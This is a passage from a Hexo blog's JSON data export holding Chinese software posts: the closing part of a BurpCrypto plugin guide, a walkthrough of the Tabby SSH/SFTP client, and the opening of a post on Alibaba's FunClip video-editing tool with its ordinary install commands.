PlainText</code>功能获取原始明文。</p>\n<p>使用方法为完整选中密文内容，右单击后找到BurpCrypto菜单中的<code>Get PlainText</code>功能，</p>\n<blockquote>\n<p>此处演示的是RSA公钥加密后通过密文查询原始明文。</p>\n</blockquote>\n<p><img src=\"/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/8.png\"></p>\n<p><img src=\"/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/9.png\"></p>\n<p><strong>十四、结尾</strong></p>\n<p>以上为本插件的使用说明，后续将会将会陆续加入国密算法、ExecJS远程模块，模块互调等小功能更新与Bug修复，如果各位师傅有更多的建议也欢迎提PR或者Issure，谢谢！</p>\n<p><strong><strong>本文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！</strong></strong></p>\n"},{"title":"替换XShelld这款SSH工具足够惊艳","date":"2024-06-16T14:42:04.000Z","_content":"\n\n\nssh工具几乎是每天都会用到的工具，今天给大家推荐一款非常不错的工具。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/1.png)\n\n\nTabby\n-----\n\nTabby 是一名老外在 Github 开源的终端连接的工具，至今已经累积 45K+ star。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/2.png)\n\nTabby 的功能特性大概有：\n\n支持多平台，Windows、MacOS（Intel 芯片/M1 芯片）、Linux 都有对应的安装包的；\n\n自带 SFTP 功能，能够与 Linux 系统传输文件；\n\n炫酷的终端页面，简单易用，以及各种插件支持等\n\n安装包\n---\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/3.png)\n\n> github地址：\n>\n> https://github.com/Eugeny/tabby/releases\n\n找到适合自己电脑的安装版本\n\n安装之后是这个页面\n\n如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/4.png)\n\nSSH 连接\n------\n\n**一开始我以为点击「New terminal」是弹出填写连接服务器的信息。**\n\n结果不是，它默认是新建一个针对本地电脑的终端窗口，比如如果你的电脑是windows 系统就会新建一个 cmd 控制窗口，如果是 macOS 系统就会新建一个 `terminal`。\n\n所以，要想新建一个连接服务器的终端，要点击「`Settings`」，进入到配置页面。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/5.png)\n\n进入到设置页面后，选择 `profiles&connections` 这个选项，然后点击「`New profile`」新建一个终端配置\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/6.png)\n\n然后选择 `ssh connection`。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/7.png)\n\n随后就会弹出配置 ssh 连接的信息，填上终端名称、IP 地址、端口号、账号密码就可以了。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/8.png)\n\n保存完后，就会出现刚新增的终端配置，然后点击运行的图标就可以了。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/9.png)\n\n也可以通过图中的小方块， 选择连接的服务器。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/10.png)\n\n选择后，就会进入到终端页面了，也就可以对服务器进行操作了。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/11.png)\n\nSFTP 传输工具\n---------\n\n前面也介绍过，这款终端工具是自带 SFTP 功能的。要使用的话，直接点击下图中的 `SFTP` 图标就行。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/12.png)\n\n然后就会弹出服务器上的目录\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/13.png)\n\n如果你想把服务器上的文件传输到本地电脑，你只需要找到服务器的文件，然后点击，就会弹出保存文件的提示。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/14.png)\n\n如果你想把本地电脑的文件放到服务器上，只需要把文件拖拽到对应的目录就行。或者点击右上角上传文件\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/15.png)\n\n设置\n--\n\nTabby 提供很多终端页面风格，都挺好看的。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/16.png)\n\n还有字体的大小设置等\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/17.png)\n\n以及常用的快捷键\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/18.png)\n\n网页版\n---\n\nTabby 网页版的入口：\n\n> https://app.tabby.sh/\n\n使用方式和PC工具没有大的差异，因为有网页工具，只要有网络的地方，就能随时随地处理问题。\n\n详细细节，可参考github官方仓库：\n\n> https://github.com/Eugeny/tabby\n","source":"_posts/替换XShelld这款SSH工具足够惊艳.md","raw":"---\ntitle: 替换XShelld这款SSH工具足够惊艳\ndate: 2024-06-16 22:42:04\ntags: Tabby\ncategories: 利器\n---\n\n\n\nssh工具几乎是每天都会用到的工具，今天给大家推荐一款非常不错的工具。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/1.png)\n\n\nTabby\n-----\n\nTabby 是一名老外在 Github 开源的终端连接的工具，至今已经累积 45K+ star。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/2.png)\n\nTabby 的功能特性大概有：\n\n支持多平台，Windows、MacOS（Intel 芯片/M1 芯片）、Linux 都有对应的安装包的；\n\n自带 SFTP 功能，能够与 Linux 系统传输文件；\n\n炫酷的终端页面，简单易用，以及各种插件支持等\n\n安装包\n---\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/3.png)\n\n> github地址：\n>\n> https://github.com/Eugeny/tabby/releases\n\n找到适合自己电脑的安装版本\n\n安装之后是这个页面\n\n如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/4.png)\n\nSSH 连接\n------\n\n**一开始我以为点击「New terminal」是弹出填写连接服务器的信息。**\n\n结果不是，它默认是新建一个针对本地电脑的终端窗口，比如如果你的电脑是windows 系统就会新建一个 cmd 控制窗口，如果是 macOS 系统就会新建一个 `terminal`。\n\n所以，要想新建一个连接服务器的终端，要点击「`Settings`」，进入到配置页面。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/5.png)\n\n进入到设置页面后，选择 `profiles&connections` 这个选项，然后点击「`New profile`」新建一个终端配置\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/6.png)\n\n然后选择 `ssh connection`。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/7.png)\n\n随后就会弹出配置 ssh 连接的信息，填上终端名称、IP 地址、端口号、账号密码就可以了。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/8.png)\n\n保存完后，就会出现刚新增的终端配置，然后点击运行的图标就可以了。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/9.png)\n\n也可以通过图中的小方块， 选择连接的服务器。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/10.png)\n\n选择后，就会进入到终端页面了，也就可以对服务器进行操作了。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/11.png)\n\nSFTP 传输工具\n---------\n\n前面也介绍过，这款终端工具是自带 SFTP 功能的。要使用的话，直接点击下图中的 `SFTP` 图标就行。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/12.png)\n\n然后就会弹出服务器上的目录\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/13.png)\n\n如果你想把服务器上的文件传输到本地电脑，你只需要找到服务器的文件，然后点击，就会弹出保存文件的提示。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/14.png)\n\n如果你想把本地电脑的文件放到服务器上，只需要把文件拖拽到对应的目录就行。或者点击右上角上传文件\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/15.png)\n\n设置\n--\n\nTabby 提供很多终端页面风格，都挺好看的。\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/16.png)\n\n还有字体的大小设置等\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/17.png)\n\n以及常用的快捷键\n\n![](./2024/06/16/替换XShelld这款SSH工具足够惊艳/18.png)\n\n网页版\n---\n\nTabby 网页版的入口：\n\n> https://app.tabby.sh/\n\n使用方式和PC工具没有大的差异，因为有网页工具，只要有网络的地方，就能随时随地处理问题。\n\n详细细节，可参考github官方仓库：\n\n> https://github.com/Eugeny/tabby\n","slug":"替换XShelld这款SSH工具足够惊艳","published":1,"updated":"2024-06-16T14:50:07.031Z","comments":1,"layout":"post","photos":[],"_id":"clylh1ryg001jbsuh1ys5d4bu","content":"<p>ssh工具几乎是每天都会用到的工具，今天给大家推荐一款非常不错的工具。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/1.png\"></p>\n<h2 id=\"Tabby\"><a href=\"#Tabby\" class=\"headerlink\" title=\"Tabby\"></a>Tabby</h2><p>Tabby 是一名老外在 Github 开源的终端连接的工具，至今已经累积 45K+ star。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/2.png\"></p>\n<p>Tabby 的功能特性大概有：</p>\n<p>支持多平台，Windows、MacOS（Intel 芯片&#x2F;M1 芯片）、Linux 都有对应的安装包的；</p>\n<p>自带 SFTP 功能，能够与 Linux 系统传输文件；</p>\n<p>炫酷的终端页面，简单易用，以及各种插件支持等</p>\n<h2 id=\"安装包\"><a href=\"#安装包\" class=\"headerlink\" title=\"安装包\"></a>安装包</h2><p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/3.png\"></p>\n<blockquote>\n<p>github地址：</p>\n<p><a href=\"https://github.com/Eugeny/tabby/releases\">https://github.com/Eugeny/tabby/releases</a></p>\n</blockquote>\n<p>找到适合自己电脑的安装版本</p>\n<p>安装之后是这个页面</p>\n<p>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/4.png\"></p>\n<h2 id=\"SSH-连接\"><a href=\"#SSH-连接\" class=\"headerlink\" title=\"SSH 连接\"></a>SSH 连接</h2><p><strong>一开始我以为点击「New terminal」是弹出填写连接服务器的信息。</strong></p>\n<p>结果不是，它默认是新建一个针对本地电脑的终端窗口，比如如果你的电脑是windows 系统就会新建一个 cmd 控制窗口，如果是 macOS 系统就会新建一个 <code>terminal</code>。</p>\n<p>所以，要想新建一个连接服务器的终端，要点击「<code>Settings</code>」，进入到配置页面。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/5.png\"></p>\n<p>进入到设置页面后，选择 <code>profiles&amp;connections</code> 这个选项，然后点击「<code>New profile</code>」新建一个终端配置</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/6.png\"></p>\n<p>然后选择 <code>ssh connection</code>。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/7.png\"></p>\n<p>随后就会弹出配置 ssh 连接的信息，填上终端名称、IP 地址、端口号、账号密码就可以了。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/8.png\"></p>\n<p>保存完后，就会出现刚新增的终端配置，然后点击运行的图标就可以了。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/9.png\"></p>\n<p>也可以通过图中的小方块， 选择连接的服务器。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/10.png\"></p>\n<p>选择后，就会进入到终端页面了，也就可以对服务器进行操作了。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/11.png\"></p>\n<h2 id=\"SFTP-传输工具\"><a href=\"#SFTP-传输工具\" class=\"headerlink\" title=\"SFTP 传输工具\"></a>SFTP 传输工具</h2><p>前面也介绍过，这款终端工具是自带 SFTP 功能的。要使用的话，直接点击下图中的 <code>SFTP</code> 图标就行。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/12.png\"></p>\n<p>然后就会弹出服务器上的目录</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/13.png\"></p>\n<p>如果你想把服务器上的文件传输到本地电脑，你只需要找到服务器的文件，然后点击，就会弹出保存文件的提示。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/14.png\"></p>\n<p>如果你想把本地电脑的文件放到服务器上，只需要把文件拖拽到对应的目录就行。或者点击右上角上传文件</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/15.png\"></p>\n<h2 id=\"设置\"><a href=\"#设置\" class=\"headerlink\" title=\"设置\"></a>设置</h2><p>Tabby 提供很多终端页面风格，都挺好看的。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/16.png\"></p>\n<p>还有字体的大小设置等</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/17.png\"></p>\n<p>以及常用的快捷键</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/18.png\"></p>\n<h2 id=\"网页版\"><a href=\"#网页版\" class=\"headerlink\" title=\"网页版\"></a>网页版</h2><p>Tabby 网页版的入口：</p>\n<blockquote>\n<p><a href=\"https://app.tabby.sh/\">https://app.tabby.sh/</a></p>\n</blockquote>\n<p>使用方式和PC工具没有大的差异，因为有网页工具，只要有网络的地方，就能随时随地处理问题。</p>\n<p>详细细节，可参考github官方仓库：</p>\n<blockquote>\n<p><a href=\"https://github.com/Eugeny/tabby\">https://github.com/Eugeny/tabby</a></p>\n</blockquote>\n","cover":"/img/liushui.png","cover_type":"img","excerpt":"","more":"<p>ssh工具几乎是每天都会用到的工具，今天给大家推荐一款非常不错的工具。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/1.png\"></p>\n<h2 id=\"Tabby\"><a href=\"#Tabby\" class=\"headerlink\" title=\"Tabby\"></a>Tabby</h2><p>Tabby 是一名老外在 Github 开源的终端连接的工具，至今已经累积 45K+ star。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/2.png\"></p>\n<p>Tabby 的功能特性大概有：</p>\n<p>支持多平台，Windows、MacOS（Intel 芯片&#x2F;M1 芯片）、Linux 都有对应的安装包的；</p>\n<p>自带 SFTP 功能，能够与 Linux 系统传输文件；</p>\n<p>炫酷的终端页面，简单易用，以及各种插件支持等</p>\n<h2 id=\"安装包\"><a href=\"#安装包\" class=\"headerlink\" title=\"安装包\"></a>安装包</h2><p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/3.png\"></p>\n<blockquote>\n<p>github地址：</p>\n<p><a href=\"https://github.com/Eugeny/tabby/releases\">https://github.com/Eugeny/tabby/releases</a></p>\n</blockquote>\n<p>找到适合自己电脑的安装版本</p>\n<p>安装之后是这个页面</p>\n<p>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/4.png\"></p>\n<h2 id=\"SSH-连接\"><a href=\"#SSH-连接\" class=\"headerlink\" title=\"SSH 连接\"></a>SSH 连接</h2><p><strong>一开始我以为点击「New terminal」是弹出填写连接服务器的信息。</strong></p>\n<p>结果不是，它默认是新建一个针对本地电脑的终端窗口，比如如果你的电脑是windows 系统就会新建一个 cmd 控制窗口，如果是 macOS 系统就会新建一个 <code>terminal</code>。</p>\n<p>所以，要想新建一个连接服务器的终端，要点击「<code>Settings</code>」，进入到配置页面。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/5.png\"></p>\n<p>进入到设置页面后，选择 <code>profiles&amp;connections</code> 这个选项，然后点击「<code>New profile</code>」新建一个终端配置</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/6.png\"></p>\n<p>然后选择 <code>ssh connection</code>。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/7.png\"></p>\n<p>随后就会弹出配置 ssh 连接的信息，填上终端名称、IP 地址、端口号、账号密码就可以了。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/8.png\"></p>\n<p>保存完后，就会出现刚新增的终端配置，然后点击运行的图标就可以了。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/9.png\"></p>\n<p>也可以通过图中的小方块， 选择连接的服务器。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/10.png\"></p>\n<p>选择后，就会进入到终端页面了，也就可以对服务器进行操作了。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/11.png\"></p>\n<h2 id=\"SFTP-传输工具\"><a href=\"#SFTP-传输工具\" class=\"headerlink\" title=\"SFTP 传输工具\"></a>SFTP 传输工具</h2><p>前面也介绍过，这款终端工具是自带 SFTP 功能的。要使用的话，直接点击下图中的 <code>SFTP</code> 图标就行。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/12.png\"></p>\n<p>然后就会弹出服务器上的目录</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/13.png\"></p>\n<p>如果你想把服务器上的文件传输到本地电脑，你只需要找到服务器的文件，然后点击，就会弹出保存文件的提示。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/14.png\"></p>\n<p>如果你想把本地电脑的文件放到服务器上，只需要把文件拖拽到对应的目录就行。或者点击右上角上传文件</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/15.png\"></p>\n<h2 id=\"设置\"><a href=\"#设置\" class=\"headerlink\" title=\"设置\"></a>设置</h2><p>Tabby 提供很多终端页面风格，都挺好看的。</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/16.png\"></p>\n<p>还有字体的大小设置等</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/17.png\"></p>\n<p>以及常用的快捷键</p>\n<p><img src=\"/./2024/06/16/%E6%9B%BF%E6%8D%A2XShelld%E8%BF%99%E6%AC%BESSH%E5%B7%A5%E5%85%B7%E8%B6%B3%E5%A4%9F%E6%83%8A%E8%89%B3/18.png\"></p>\n<h2 id=\"网页版\"><a href=\"#网页版\" class=\"headerlink\" title=\"网页版\"></a>网页版</h2><p>Tabby 网页版的入口：</p>\n<blockquote>\n<p><a href=\"https://app.tabby.sh/\">https://app.tabby.sh/</a></p>\n</blockquote>\n<p>使用方式和PC工具没有大的差异，因为有网页工具，只要有网络的地方，就能随时随地处理问题。</p>\n<p>详细细节，可参考github官方仓库：</p>\n<blockquote>\n<p><a href=\"https://github.com/Eugeny/tabby\">https://github.com/Eugeny/tabby</a></p>\n</blockquote>\n"},{"title":"最强阿里自动化视频剪辑工具","date":"2024-06-16T04:57:41.000Z","_content":"\n\n这几年短视频非常火爆，尤其是抖音等短视频平台的崛起，很多人都可以把自己的日常生活或者工作发到网上，吸引很多人的关注，也有一些人因此赚到了人生第一桶金。\n\n然后剪辑视频却是一件非常耗费精力的事情，经常要几个小时才能剪出来一个视频。\n\n今天给大家推荐一个阿里开源的自动化视频剪辑工具—FunClip，可以帮助大家轻松剪辑视频。\n\nFunClip是一款完全开源的自动化视频剪辑工具，可以安装在我们自己的电脑上，支持离线使用。还可以通过调用阿里巴巴通义实验室开源的 FunASR Paraformer 系列模型进行视频的语音识别，然后我们可以自由选择识别结果中的文本片段或说话人，点击裁剪按钮即可获取对应片段的视频。\n\n所以使用 **FunClip** 剪辑视频非常的简单，不用像传统的视频剪辑软件，需要我们手动自己分割视频。\n\n在上述基本功能的基础上，FunClip有以下特色：\n\n*   FunClip融合了众多高级语言模型的调用机制，并开放了灵活的prompt设置功能，旨在探索利用大型语言模型进行视频编辑的新方法。\n\n*   FunClip采用了阿里巴巴开源的顶尖工业级语音识别模型——Paraformer-Large，它在开源中文ASR模型中表现出色，Modelscope的下载次数已超过1300万次，同时能够精确地预测出时间戳。\n\n*   此外，FunClip还整合了SeACo-Paraformer的热词定制功能，在语音识别过程中可以特别指定实体词、人名等作为热词，从而显著提高识别的准确性。\n\n*   FunClip还配备了CAM++的说话人识别模型，用户可以利用自动识别出的说话人ID作为编辑的依据，轻松裁剪出特定说话人的部分。\n\n*   通过Gradio的交互界面，用户可以轻松实现上述功能，安装过程简洁，操作便捷，并且支持在服务器端部署，通过网页进行操作。\n\n*   FunClip还支持多段视频的自由编辑，并且能够自动生成完整的视频SRT字幕文件以及目标剪辑片段的SRT字幕，简化了整个编辑流程。\n\n\n而且FunClip还加入了大语言模型智能裁剪功能，集成了qwen系列，gpt系列等模型，提供默认prompt，我们也可以训练自己的prompt，还支持通过FunASR开源的SeACo-Paraformer模型在视频剪辑中进一步支持热词定制化。\n\n![](./2024/06/16/最强阿里自动化视频剪辑工具/1.png)\n\n  **安装🔨**\n----------\n\n**![图片](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/NoProb.png?tp=webp&wxfrom=5&wx_lazy=1&wx_co=1) 安装python环境**\n\n\nFunClip的运行仅依赖python环境，所以我们只需要搭建好python环境就OK了。\n\n```\n# 克隆funclip仓库\ngit clone https://github.com/alibaba-damo-academy/FunClip.git\ncd FunClip\n# 安装相关Python依赖\npip install -r ./requirements.txt\n```\n\n![图片](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/LetMeSee.png?tp=webp&wxfrom=5&wx_lazy=1&wx_co=1) 安装 imagemagick\n\n\n希望使用自动生成字幕的视频裁剪功能，那么需要安装imagemagick：\n\n\n\n*   Ubuntu\n    \n\n```\napt-get -y update && apt-get -y install ffmpeg imagemagick\nsed -i 's/none/read,write/g' /etc/ImageMagick-6/policy.xml\n```\n\n*   MacOS\n    \n\n```\nbrew install imagemagick\nsed -i 's/none/read,write/g' /usr/local/Cellar/imagemagick/7.1.1-8_1/etc/ImageMagick-7/policy.xml\n```\n\n*   Windows\n    \n\n\n\n\n需要从下面的地址下载并安装imagemagick：\n\n```\nhttps://imagemagick.org/script/download.php#windows\n```\n\n\n\n\n  **使用FunClip**\n\n首先使用下面的命令启动FunClip：\n\n```\npython funclip/launch.py\n```\n\n随后在浏览器中访问localhost:7860 就能进入首页。\n\n然后按如下步骤即可进行视频剪辑：\n\n\n\n*   上传你的视频（或使用下方的视频用例）\n    \n*   设置热词，设置文件输出路径（保存识别结果、视频等）\n    \n*   点击识别按钮获取识别结果，或点击识别+区分说话人在语音识别基础上识别说话人ID\n    \n*   将识别结果中的选段复制到对应位置，或者将说话人ID输入到对应为止\n    \n*   配置剪辑参数，偏移量与字幕设置等\n    \n*   点击“裁剪”或“裁剪+字幕”按钮\n\n\n\n\n\n![](./2024/06/16/最强阿里自动化视频剪辑工具/2.png)\n使用大语言模型裁剪请参考如下教程：\n\n![](./2024/06/16/最强阿里自动化视频剪辑工具/3.png)\nFunClip 在魔塔社区部署了在线服务，可以通过下面的地址体验：\n\nhttps://modelscope.cn/studios/iic/funasr\\_app\\_clipvideo/summary\n\n我们可以上传自己的视频或者音频，也可以使用 FunClip 提供的demo：\n\n![](./2024/06/16/最强阿里自动化视频剪辑工具/4.png)\n更多内容，可以到github了解：\n\nhttps://github.com/alibaba-damo-academy/FunClip\n\n总的来说，FunClip是一款完全开源、本地部署的自动化视频剪辑工具，可以帮助我们更加轻松地剪辑视频，记录我们的美好生活。","source":"_posts/最强阿里自动化视频剪辑工具.md","raw":"---\ntitle: 最强阿里自动化视频剪辑工具\ndate: 2024-06-16 12:57:41\ntags: 视频工具\ncategories: 